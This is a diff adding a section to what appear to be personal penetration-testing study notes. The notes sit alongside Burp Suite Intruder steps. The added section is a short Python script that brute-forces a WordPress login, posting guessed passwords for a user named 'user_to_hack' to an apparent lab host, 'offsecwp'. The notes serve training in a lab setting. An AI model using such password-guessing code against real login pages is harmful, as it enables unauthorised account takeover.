@@ -66,6 +66,16 @@ Repeater > Send
 Proxy > HTTP history > right-click "Send to intruder"
 Intruder > Clear/Add > Payload > Paste > paste a wordlist > check the return code
 
+## Python manual password attack
+
+Using the `requests` module: https://requests.readthedocs.io/en/latest/api
+```
+import requests
+for i in ['test', 'pass', 'password']:
+    r = requests.post('http://offsecwp/wp-login.php', data={'login_field': 'user_to_hack', 'password_field': i})
+    print(r.status_code, len(r.content))
+```
+
 ## Javascript (console: `^C+^S+k`)
 
 ```
